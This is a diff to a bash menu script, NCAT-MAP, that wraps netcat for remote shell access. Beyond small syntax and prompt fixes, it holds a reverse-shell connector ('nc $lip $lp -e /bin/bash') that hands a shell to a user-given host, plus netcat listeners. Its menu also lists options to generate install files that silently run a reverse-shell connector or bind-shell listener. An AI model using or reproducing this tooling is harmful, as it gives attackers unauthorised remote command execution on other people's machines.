@@ -8,6 +8,12 @@ reset () {
   echo "--------------------------------------------------------------------------------"
 }
 
+#Defining Colors
+black='\033[0;30m'
+red='\033[0;31m'
+
+
+
 #Start
 clear
 figlet NCAT-MAP
@@ -388,13 +394,13 @@ if [ $ncOp == 6 ]
 then
   reset
   cat<<END
-  1) Listen For a Reverse-Shell Connection
-  2) Connect To A Reverse-Shell Listener !!!
-  3) Listen for a Bind-Shell Connection
-  4) Connect To A Bind-Shell Listener !!!
-  5) Generate An Install File That Installs & Runs A Reverse-Shell Connector
-  6) Generate An Install File That Installs & Runs A Bind-Shell Listener
-  0) Exit
+1) Listen For a Reverse-Shell Connection
+2) Connect To A Reverse-Shell Listener !!!
+3) Listen for a Bind-Shell Connection
+4) Connect To A Bind-Shell Listener !!!
+5) Generate An Install File That Installs & Runs A Reverse-Shell Connector
+6) Generate An Install File That Installs & Runs A Bind-Shell Listener
+0) Exit
 END
   read -p "Option: " ncrsOptions
 fi
@@ -403,9 +409,10 @@ fi
 if [ $ncrsOptions == 1 ]
 then
   reset
-  read -p "Listen For A Reverse-Shell? [yes/no]" lfars
-  if [ $lfars == yes]
+  read -p "Listen For A Reverse-Shell? [yes/no]: " lfars
+  if [ $lfars == yes ]
   then
+    reset
     read -p "Listener Port: " rslPort
     reset
     echo "Press CTRL-C To Stop"
@@ -417,14 +424,14 @@ then
     sleep 1
     reset
     echo "NetCat Is Active"
-    nc -l -p $rslPort
+    nc -lvp $rslPort
     reset
     read -p "Go Back? [yes/no]: " back
     if [ $back == yes ]
     then
       ./ncat-map
     fi
-  elif [ $lfars == "no"]
+  elif [ $lfars == no ]
   then
     reset
     read -p "Go Back? [yes/no]: " back
@@ -440,7 +447,7 @@ if [ $ncrsOptions == 2 ]
 then
   reset
   read -p "Connect To A Reverse-Shell Listener? [yes/no]: " ctarsl
-  if [ $ctarsl == yes]
+  if [ $ctarsl == yes ]
   then
     reset
     read -p "Listener IP: " lip
@@ -455,17 +462,19 @@ then
     echo "1"
     sleep 1
     reset
+    echo Connected To $lip:$lp --- Just Type Your Command
+    echo "--------------------------------------------------------------------------------"
     nc $lip $lp -e /bin/bash
     reset
-    read -p "Go Back? [yes/no]" back
-    if [ $back == yes]
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
     then
       ./ncat-map
     fi
-  elif [ $ctarsl == no]
+  elif [ $ctarsl == no ]
   then
     reset
-    read -p "Go Back? [yes/no]" back
+    read -p "Go Back? [yes/no]: " back
     if [ $back == yes ]
     then
       ./ncat-map
@@ -477,9 +486,10 @@ fi
 if [ $ncrsOptions == 3 ]
 then
   reset
-  read -p "Listen For A Bind-Shell? [yes/no]" lfabs
-  if [ $lfabs == yes]
+  read -p "Listen For A Bind-Shell? [yes/no]: " lfabs
+  if [ $lfabs == yes ]
   then
+    reset
     read -p "Port To Listen On: " ptlo
     reset
     echo "Press CTRL-C To Stop"
@@ -498,7 +508,7 @@ then
     then
       ./ncat-map
     fi
-  elif [ $lfabs == "no"]
+  elif [ $lfabs == no ]
   then
     read -p "Go Back? [yes/no]: " back
     if [ $back == yes ]
@@ -514,7 +524,7 @@ if [ $ncrsOptions == 4 ]
 then
   reset
   read -p "Connect To A Bind-Shell Listener? [yes/no]: " ctabsl
-  if [ $ctabsl == yes]
+  if [ $ctabsl == yes ]
   then
     reset
     read -p "Listener IP: " lip
@@ -529,20 +539,22 @@ then
     echo "1"
     sleep 1
     reset
+    echo Connected To $lip:$lp --- Just Type Your Command
+    echo "--------------------------------------------------------------------------------"
     nc $lip $lp
     reset
-    read -p "Go Back? [yes/no]" back
-    if [ $back == yes]
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
     then
       ./ncat-map
     fi
-  elif [ $ctarsl == no]
+  elif [ $ctarsl == no  ]
   then
     reset
-    read -p "Go Back? [yes/no]" back
+    read -p "Go Back? [yes/no]: " back
     if [ $back == yes ]
     then
       ./ncat-map
     fi
   fi
-f4
+fi
